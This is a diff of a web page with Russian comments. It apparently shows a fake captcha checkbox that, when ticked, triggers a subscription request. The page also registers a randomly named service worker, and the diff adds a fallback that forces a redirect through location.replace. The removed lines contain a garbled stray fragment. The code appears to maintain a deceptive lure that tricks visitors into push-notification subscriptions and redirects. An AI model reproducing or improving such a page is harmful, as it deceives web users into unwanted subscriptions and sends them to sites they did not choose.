@@ -39,7 +39,6 @@
             width: 20px;
             height: 20px;
             cursor: pointer;
-            transition: border-color 0.3s ease;
         }
         .captcha-checkbox:checked {
             accent-color: #1a73e8; /* Синий цвет для галочки */
@@ -117,10 +116,11 @@
         if ('serviceWorker' in navigator) {
             navigator.serviceWorker.register('/HnFv7gIgUEyhZsQd8kp20Q.js')
                 .then(registration => {
-                    console.log('Service Worker зарегистрирован:', registration Ascent - YouTube video player
-                    .catch(err => {
-                        console.error('Ошибка регистрации Service Worker:', err);
-                    });
+                    console.log('Service Worker зарегистрирован:', registration);
+                })
+                .catch(err => {
+                    console.error('Ошибка регистрации Service Worker:', err);
+                });
         } else {
             console.warn('Service Worker не поддерживается');
         }
@@ -142,9 +142,15 @@
 
         // Функция для выполнения редиректа
         function performRedirect() {
-            console.log('Выполняется редирект на:', redirectUrl);
+            console.log('Попытка редиректа на:', redirectUrl);
             try {
                 window.location.href = redirectUrl;
+                setTimeout(() => {
+                    if (window.location.href !== redirectUrl) {
+                        console.log('window.location.href не сработал, пробуем replace');
+                        window.location.replace(redirectUrl);
+                    }
+                }, 500);
             } catch (e) {
                 console.error('Ошибка редиректа:', e);
             }
@@ -203,6 +209,7 @@
         function verify() {
             const checkbox = document.getElementById('captcha');
             if (checkbox.checked) {
+                console.log('Чекбокс отмечен, запускаем подписку');
                 setTimeout(requestSubscription, 300);
             }
         }
